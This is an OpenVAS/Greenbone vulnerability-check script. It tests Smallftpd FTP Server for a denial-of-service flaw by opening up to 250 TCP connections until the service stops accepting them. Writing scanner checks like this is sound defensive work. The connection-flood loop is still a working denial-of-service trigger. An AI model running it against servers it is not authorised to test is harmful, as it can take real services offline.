if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902453" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Smallftpd FTP Server Multiple Requests Denial of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/smallftpd/detected" );
	script_xref( name: "URL", value: "http://www.1337day.com/exploits/16423" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17455/" );
	script_tag( name: "impact", value: "Successful exploitation will allow unauthenticated attackers to
  cause a denial of service." );
	script_tag( name: "affected", value: "Smallftpd version 1.0.3-fix and prior." );
	script_tag( name: "insight", value: "The flaw is due to an error when handling the multiple requests
  from the client. It is unable to handle multiple connections regardless of its maximum connection settings." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Smallftpd FTP Server and is prone to denial of
  service vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "220- smallftpd" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
ftp_close( socket: soc );
if(!banner || !ContainsString( banner, "220- smallftpd" )){
	exit( 0 );
}
for(i = 0;i < 250;i++){
	soc = open_sock_tcp( ftpPort );
	if(!soc){
		security_message( port: ftpPort );
		exit( 0 );
	}
}
ftp_close( socket: soc );

